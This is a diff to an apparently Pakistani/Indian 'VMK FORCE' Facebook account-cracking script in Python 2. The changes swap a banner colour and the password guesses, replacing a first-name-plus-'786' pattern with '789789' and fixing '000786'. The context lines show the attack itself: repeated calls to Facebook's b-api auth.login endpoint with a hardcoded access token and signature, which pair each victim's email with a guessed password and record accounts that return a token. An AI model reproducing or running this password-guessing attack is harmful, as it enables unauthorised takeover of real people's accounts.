@@ -60,7 +60,7 @@ def hopss(z):
 banner = """
 \x1b[1;92m V M K  F O R C E
 \x1b[1;93m M A K E R  A S A D  A N S A A R I
-\x1b[1;94m O W N E R  A M I T  K U M A R
+\x1b[1;95m O W N E R  A M I T  K U M A R
               (FREEDOM FIGHTER)
 \x1b[1;94m-----------°°°°°°°°°------------°°°°°°°°°-----
 \x1b[1;94m➣ Coder   : ASAD ANSAARI
@@ -280,7 +280,7 @@ def crack_menu():
 							crt.close()
 							checkpoint.append(user+pass2)
 						else:
-							pass3 = b['first_name'] + '786'
+							pass3 ='789789'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
@@ -336,7 +336,7 @@ def crack_menu():
 															crt.close()
 															checkpoint.append(user+pass6)
 														else:
-															pass7 = b '000786'
+															pass7 ='000786'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if "access_token" in q:
